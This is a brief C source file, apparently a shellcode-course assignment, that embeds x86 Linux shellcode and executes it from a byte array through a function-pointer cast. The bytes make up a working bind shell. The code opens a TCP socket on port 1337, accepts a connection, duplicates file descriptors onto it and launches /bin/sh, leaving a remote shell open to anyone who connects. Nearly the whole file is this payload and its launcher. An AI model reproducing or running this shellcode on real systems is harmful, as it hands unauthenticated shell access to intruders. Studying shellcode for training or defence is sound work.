// execute.c
// Author: Joris Hartog
// Date  : 30-11-2015
// St.nr.: SLAE-704

#include <stdio.h>
#include <string.h>

#define PORT "\x05\x39"

unsigned char shellcode[] = \ 
"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x50\x66\x68"
PORT
"\x43\x66\x53\x89\xe6\x6a\x10\x56\x52\x89\xe1\xb0\x66\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x52\x89\xe1\x43\xb0\x66\xcd\x80\x6a\x0e\x59\x89\xc3\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main() {
	printf("Shellcode length: %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

